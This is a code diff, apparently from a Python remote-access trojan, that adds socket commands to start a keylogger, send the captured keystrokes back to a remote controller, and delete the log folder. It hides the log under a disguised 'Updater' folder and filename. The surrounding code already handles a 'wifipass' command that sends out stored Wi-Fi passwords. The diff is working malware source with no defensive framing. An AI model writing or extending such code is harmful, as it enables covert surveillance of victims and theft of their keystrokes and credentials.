@@ -362,6 +362,26 @@ def run_commands():
                 else:
                     connection.send(str.encode(
                         "Sorry, but this command is only available for windows and mac os"))
+            elif ldata == "keylogger start":
+                if os.path.isfile("C:\\Users\\" + getpass.getuser() + "\\Updater\\updateDDDMA.txt"):
+                    connection.send(str.encode("exists"))
+                else:
+                    connection.send(str.encode("started"))
+                    start_keylogger()
+            elif ldata == "keylogger get":
+                if os.path.isfile("C:\\Users\\" + getpass.getuser() + "\\Updater\\updateDDDMA.txt") == False:
+                    connection.send(str.encode("nan"))
+                else:
+                    connection.send(str.encode("getting"))
+                    with open(path, "r") as file:
+                        connection.send(str.encode(file.read()))
+                        file.close()
+            elif ldata == "keylogger end":
+                if os.path.isfile("C:\\Users\\" + getpass.getuser() + "\\Updater\\updateDDDMA.txt"):
+                    connection.send(str.encode("nan"))
+                else:
+                    connection.send(str.encode("ending"))
+                    os.rmdir("C:\\Users\\" + getpass.getuser() + "\\Updater")
             elif ldata == "wifipass" or ldata == "wifi pass":
                 pn = 0
                 while True:
@@ -381,7 +401,7 @@ def run_commands():
                         connection.send(str.encode(str(something)))
                         break
 
-            elif "pubip" not in ldata and "wifipass" not in ldata:
+            elif "pubip" not in ldata and "wifipass" not in ldata and "wifi pass" not in ldata:
                 if ldata != "download" and "cd " not in ldata and "cd.." not in ldata and has_ben_defed == 1:
                     connection.send(str.encode(
                         str(output_str) + str(os.getcwd()) + '> '))
